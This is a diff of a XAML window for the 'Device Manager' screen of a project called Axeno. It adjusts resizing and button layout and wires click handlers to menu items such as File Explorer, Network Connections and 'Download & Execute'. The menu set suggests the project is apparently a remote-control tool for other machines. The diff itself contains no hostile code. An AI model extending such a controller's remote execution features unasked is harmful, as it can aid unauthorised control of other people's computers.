@@ -4,7 +4,7 @@
         WindowStyle="None"
         AllowsTransparency="True"
         Background="Transparent"
-        ResizeMode="NoResize"
+        ResizeMode="CanResize"
                 xmlns:mah="http://metro.mahapps.com/winfx/xaml/controls"
         xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
@@ -25,18 +25,20 @@ xmlns:behave="clr-namespace:Axeno.Interaction.Behaviours"
         <behave:CloseBehavior Storyboard="{StaticResource ExitAnimation}"/>
     </i:Interaction.Behaviors>
     <Border CornerRadius="25" BorderBrush="DarkGray" BorderThickness="0" Padding="6" Background="White" MouseDown="Border_MouseDown">
-        <Grid>
+        
+        <Grid Name="grddevmgr">
+
+
             <Border  CornerRadius="25, 25, 0, 0" Background="DarkGray" Margin="-6,-6,-6,473" Height="41" />
             <TextBlock Text="Axeno" FontWeight="Bold" FontSize="20" Margin="423,0,423,514"/>
             <Ellipse Fill="Red" Margin="869,9,4,485" MouseDown="closebtn_MouseDown" Name="closebtn"/>
-            <Ellipse Fill="Orange" Margin="850,9,23,485" MouseDown="minimizebtn_MouseDown" Name="minimizebtn"/>
             <TextBlock Text="Device Manager" FontWeight="Bold" FontSize="20" Margin="368,0,367,476"/>
             <Menu Margin="4,40,4,434">
                 <MenuItem Header="General" >
                     <MenuItem Header="System Information" Name="sysinfoclick" Click="sysinfoclick_Click"/>
                 </MenuItem>
                 <MenuItem Header="System" >
-                    <MenuItem Header="File Explorer" />
+                    <MenuItem Header="File Explorer" Name="filexplorer" Click="filexplorer_Click"/>
                     <MenuItem Header="Registry Editor" />
                     <MenuItem Header="Process Manager" />
                     <MenuItem Header="Command Line" />
@@ -50,8 +52,8 @@ xmlns:behave="clr-namespace:Axeno.Interaction.Behaviours"
 
                 </MenuItem>
                 <MenuItem Header="Networking">
-                    <MenuItem Header="Download &amp; Execute"/>
-                    <MenuItem Header="Network Connections" />
+                    <MenuItem Header="Download &amp; Execute" Name="sendFile" Click="sendFile_Click"/>
+                    <MenuItem Header="Network Connections" Name="netcon" Click="netcon_Click"/>
                 </MenuItem>
                 <MenuItem Header="Power">
                     <MenuItem Header="Signout" Name="signout" Click="signout_Click"/>
@@ -66,6 +68,7 @@ xmlns:behave="clr-namespace:Axeno.Interaction.Behaviours"
 
             </Menu>
             <Frame Name="frmdevmgr" NavigationUIVisibility="Hidden" Margin="0,73,0,4" />
+            <Ellipse Fill="DarkOrange" Margin="852,9,22,485" MouseDown="minimizebtn_MouseDown" x:Name="minimizebtn"/>
         </Grid>
     </Border>
 </Window>
